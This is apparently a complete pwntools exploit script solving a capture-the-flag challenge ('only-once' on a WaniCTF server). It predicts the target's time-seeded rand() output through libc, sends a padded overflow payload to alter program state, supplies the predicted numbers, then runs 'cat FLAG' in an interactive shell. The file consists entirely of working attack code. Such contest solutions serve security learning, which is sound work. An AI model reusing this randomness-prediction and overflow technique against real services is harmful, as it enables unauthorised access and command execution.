from pwn import *
from ctypes import *

# p = process('./chall')
p = remote('only-once-pwn.wanictf.org', 9002)
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(libc.time(0))

num = libc.rand() % 1000 + libc.rand() % 1000
payload = str(num).encode().ljust(8, b'a') + b'\xff'
p.sendline(payload)

num = libc.rand() % 1000 + libc.rand() % 1000

for _ in range(3):
    num = libc.rand() % 1000 + libc.rand() % 1000
    payload = str(num).encode()
    p.sendline(payload)

p.sendline(b'cat FLAG')

p.interactive()
